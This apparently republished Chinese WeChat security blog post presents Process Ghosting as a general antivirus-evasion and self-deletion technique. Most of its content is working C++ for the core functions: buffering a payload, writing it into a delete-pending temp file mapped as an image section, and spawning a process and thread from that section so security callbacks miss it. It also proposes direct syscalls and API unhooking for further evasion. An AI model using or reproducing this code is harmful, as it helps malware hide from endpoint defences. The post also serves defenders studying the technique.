#  ProcessGhosting-一套通用的免杀，自删除解决方案

原创 knight  [ luomasec ](javascript:void\(0\);)

**luomasec** ![]()

微信号 gh_e9df6be6f498

功能介绍 一个专注于高质量安全研究 、渗透测试、漏洞挖掘的分享平台，点关注，上高速！！！

____

__

收录于话题

## 声明

本文来自项目https://github.com/hasherezade/process_ghosting

参考自https://www.elastic.co/blog/process-ghosting-a-new-executable-image-
tampering-attack

## 前置知识

### 一、Windows如何启动一个进程

1、启动可执行文件的句柄，hFile = CreateFile(“C:\Windows\System32\svchost.exe”)

2、创建一个section，将exe映射进这个section，hSection = NtCreateSection(hFile, SEC_IMAGE)

3、使用这个session创建一个进程，hProcess = NtCreateProcessEx(hSection)

4、分配参数和环境变量，CreateEnvironmentBlock/NtWriteVirtualMemory

5、创建一个线程并执行，NtCreateThreadEx

### 二、windows删除文件方法

1、在设置的 FILE_SUPERSEDE[1]或者CREATE_ALWAYS[2] 标志的旧文件上创建一个新文件。

2、创建或者打开文件时设置FILE_DELETE_ON_CLOSE[3]或者FILE_FLAG_DELETE_ON_CLOSE[4]。

3、通过NtSetInformationFile[5]调用FileDispositionInformation[6]时，将FILE_DISPOSITION_INFORMATION[7]结构中的
DeleteFile 字段设置为 TRUE。

### 三、安全产品如何判断一个进程的启动

安全产品驱动开发者通过在PsSetCreateProcessNotifyRoutineEx[8]、PsSetCreateThreadNotifyRoutineEx[9]等API来监控上层程序创建进程或线程的状态。但是PsSetCreateProcessNotifyRoutineEx
回调实际上并不是在创建进程时调用，而是在创建这些进程中的第一个线程时调用。所以在exe映射进内存，但是没有起线程的状态时，安全产品不会认为这个exe是启动状态。

## PocessGhosting的实现方法

此方法涉及到三个文件，分别是black exe，white exe， temp file

•black exe：要免杀获取自删除的文件

      •white exe：这个可以是任意文件，它的主要作用是获取white exe的进程环境变量，此程序不会被打开      •temp file：这是为black exe创建的temp文件，会被设置为删除状态，并且在启动进程后会自动删除。

  

下面是整个代码的思维导图：

![](https://gitee.com/fuli009/images/raw/master/public/20211015102214.png)

其中主要涉及到三个函数分别是buffer_payload、process_ghost、make_section_from_delete_pending_file。

### buffer_payload

它的主要作用是打开black exe文件句柄，并将black
exe映射进内存，但是不执行后续的启动process操作。而后将exe映射进内存中的数据以指针的形式返回。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    BYTE* buffer_payload(wchar_t *filename, OUT size_t &r_size) {    HANDLE file = CreateFileW(filename, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);//获取文件handle    if (file == INVALID_HANDLE_VALUE) {        cout << "create file fail!\n" << endl;    }    HANDLE mapping = CreateFileMapping(file, 0, PAGE_READONLY, 0, 0, 0); //打开或创建文件的映射对象，返回值为新创建的文件映射handle    if (!mapping) {        CloseHandle(file);        return nullptr;        cout << "create map fail!\n" << endl;    }    BYTE* dllRawData = (BYTE*)MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);//将文件映射handle映射到进程空间    if (dllRawData == nullptr) {        cout << "map move fail!\n" << endl;        CloseHandle(mapping);        CloseHandle(file);        return nullptr;    }    r_size = GetFileSize(file, 0);    BYTE* localCopyAddress = (BYTE*)VirtualAlloc(NULL, r_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);//内存中申请文件大小的地址空间    memcpy(localCopyAddress, dllRawData, r_size);    UnmapViewOfFile(dllRawData);//解映射    CloseHandle(mapping);    CloseHandle(file);    return localCopyAddress;  
    }

### process_ghost

这个函数的主要作用是进行启动进程的操作。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    bool process_ghost(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize){    wchar_t dummy_name[MAX_PATH] = { 0 };    wchar_t temp_path[MAX_PATH] = { 0 };    DWORD size = GetTempPathW(MAX_PATH, temp_path);//获取temp文件路径    GetTempFileNameW(temp_path, L"TH", 0, dummy_name);//给temp文件创建一个名称  
        HANDLE hSection = make_section_from_delete_pending_file(dummy_name, payladBuf, payloadSize);//将temp文件属性设置为删除状态，并将文件映射进section    if (!hSection || hSection == INVALID_HANDLE_VALUE) {        return false;    }    HANDLE hProcess = nullptr;    NTSTATUS status = NtCreateProcessEx(        &hProcess,        PROCESS_ALL_ACCESS,        NULL,        NtCurrentProcess(),        PS_INHERIT_HANDLES,        hSection,        NULL,        NULL,        FALSE    );//根据传入的section创建process    if (status != STATUS_SUCCESS) {        cerr << "NtCreateProcessEx failed! Status: " << hex << status << endl;        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {            cerr << "[!] The payload has mismatching bitness!" << endl;        }        return false;    }    PROCESS_BASIC_INFORMATION pi = { 0 };    DWORD ReturnLength = 0;    status = NtQueryInformationProcess(        hProcess,        ProcessBasicInformation,        &pi,        sizeof(PROCESS_BASIC_INFORMATION),        &ReturnLength    );//索引创建的进程基础信息    if (status != STATUS_SUCCESS) {        std::cerr << "NtQueryInformationProcess failed" << std::endl;        return false;    }    PEB peb_copy = { 0 };    if (!buffer_remote_peb(hProcess, pi, peb_copy)) {//将black exe的内存数据复制到peb_copy，主要作用是获取ImageBaseAddress        return false;    }    ULONGLONG imageBase = (ULONGLONG)peb_copy.ImageBaseAddress;    DWORD payload_ep = get_entry_point_rva(payladBuf);//获取入口点的偏移地址    ULONGLONG procEntry = payload_ep + imageBase;//获取到入口点的地址    if (!setup_process_parameters(hProcess, pi, targetPath)) {//将环境变量写入进程的内存空间，此处是唯一一次用到white exe的地方:)        std::cerr << "Parameters setup failed" << std::endl;        return false;    }    HANDLE hThread = NULL;    status = NtCreateThreadEx(&hThread,        THREAD_ALL_ACCESS,        NULL,        hProcess,        (LPTHREAD_START_ROUTINE)procEntry,        NULL,        FALSE,        0,        0,        0,        NULL    );//在进程中black exe内存的入口点创建线程  
        if (status != STATUS_SUCCESS) {        std::cerr << "NtCreateThreadEx failed: " << GetLastError() << std::endl;        return false;    }  
        return true;}

### make_section_from_delete_pending_file

其中，设置temp文件为删除状态，并将black exe的内存映射到temp文件。

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    HANDLE make_section_from_delete_pending_file(wchar_t* filePath, BYTE* payladBuf, DWORD payloadSize) {    HANDLE hDelFile = open_file(filePath);//打开temp文件    NTSTATUS status = 0;    IO_STATUS_BLOCK status_block = { 0 };  
        FILE_DISPOSITION_INFORMATION info = { 0 };    info.DeleteFile = TRUE;    status = NtSetInformationFile(hDelFile, &status_block, &info, sizeof(info), FileDispositionInformation);//改变文件对象信息，将设置为请求删除文件状态。    if (!NT_SUCCESS(status)) {        cout << "Setting information failed: " << hex << status << "\n";        return INVALID_HANDLE_VALUE;    }    LARGE_INTEGER ByteOffset = { 0 };  
        status = NtWriteFile(        hDelFile,        NULL,        NULL,        NULL,        &status_block,        payladBuf,        payloadSize,        &ByteOffset,        NULL    );//将传入的black exe的内存地址写入temp文件    if (!NT_SUCCESS(status)) {        DWORD err = GetLastError();        cout << "Failed writing payload! Error: " << hex << err << endl;        return INVALID_HANDLE_VALUE;    }    HANDLE hSection = nullptr;    status = NtCreateSection(&hSection,        SECTION_ALL_ACCESS,        NULL,        0,        PAGE_READONLY,        SEC_IMAGE,        hDelFile    );//为temp文件创建section    if (status != STATUS_SUCCESS) {        cerr << "NtCreateSection failed: " << hex << status << endl;        return INVALID_HANDLE_VALUE;    }    NtClose(hDelFile);//关闭handle，同时temp文件消失    hDelFile = nullptr;  
        return hSection;}  
    

## 后续研究

在整个项目中，需要用到NtCreateProcessEx和NtCreateThreadEx这样的敏感函数，通过对这两个函数进行systemcall，使用直接系统调用的方式来进行免杀处理。并使用unhook
api，来解NtReadVirtualMemory、NtAllocateVirtualMemory、NtWriteVirtualMemory这几个对内存操作的nt函数hook。

具体代码项目地址：https://github.com/knightswd/ProcessGhosting

### References

`[1]` FILE_SUPERSEDE:  _https://docs.microsoft.com/en-
us/windows/win32/api/winternl/nf-winternl-ntcreatefile_  
`[2]` CREATE_ALWAYS:  _https://docs.microsoft.com/en-
us/windows/win32/api/fileapi/nf-fileapi-createfilew_  
`[3]` FILE_DELETE_ON_CLOSE:  _https://docs.microsoft.com/en-
us/windows/win32/api/winternl/nf-winternl-ntcreatefile_  
`[4]` FILE_FLAG_DELETE_ON_CLOSE:  _https://docs.microsoft.com/en-
us/windows/win32/api/fileapi/nf-fileapi-createfilew_  
`[5]` NtSetInformationFile:  _https://docs.microsoft.com/en-us/windows-
hardware/drivers/ddi/ntifs/nf-ntifs-ntsetinformationfile_  
`[6]` FileDispositionInformation:  _https://docs.microsoft.com/en-us/windows-
hardware/drivers/ddi/ntifs/nf-ntifs-ntsetinformationfile_  
`[7]` FILE_DISPOSITION_INFORMATION:  _https://docs.microsoft.com/en-
us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-_file_disposition_information_  
`[8]` PsSetCreateProcessNotifyRoutineEx:  _https://docs.microsoft.com/en-
us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-
pssetcreateprocessnotifyroutineex_  
`[9]` PsSetCreateThreadNotifyRoutineEx:  _https://docs.microsoft.com/en-
us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-
pssetcreatethreadnotifyroutineex_

  

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

ProcessGhosting-一套通用的免杀，自删除解决方案

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

